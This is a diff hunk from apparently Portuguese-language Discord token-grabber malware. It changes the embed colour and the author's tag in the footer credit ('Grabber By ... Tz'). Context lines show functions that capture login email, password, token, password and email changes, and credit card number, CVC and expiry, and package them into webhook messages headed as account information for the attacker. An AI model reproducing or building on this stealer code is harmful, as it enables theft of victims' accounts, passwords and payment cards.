@@ -145,7 +145,7 @@ function Login(email, password, token) {
             avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 15158332,
                     "fields": [
                         {
                             "name": "**Informações da Conta**",
@@ -163,7 +163,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Grabber By 🜲 Oi, eu sou o Tz#3620・https://instagram.com/tzfofo"
+                        "text": "Grabber By 🜲 Oi, eu sou o Tz#0001・https://instagram.com/tzfofo"
                     }
                 }
             ]
@@ -210,7 +210,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Grabber By 🜲 Oi, eu sou o Tz#3620・https://instagram.com/tzfofo"
+                        "text": "Grabber By 🜲 Oi, eu sou o Tz#0001・https://instagram.com/tzfofo"
                     }                 
                 }
             ]
@@ -257,7 +257,7 @@ function ChangeEmail(newemail, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Grabber By 🜲 Oi, eu sou o Tz#3620・https://instagram.com/tzfofo"
+                        "text": "Grabber By 🜲 Oi, eu sou o Tz#0001・https://instagram.com/tzfofo"
                     }                
                 }
             ]
@@ -304,7 +304,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Grabber By 🜲 Oi, eu sou o Tz#3620・https://instagram.com/tzfofo"
+                        "text": "Grabber By 🜲 Oi, eu sou o Tz#0001・https://instagram.com/tzfofo"
                     }
                 }
             ]
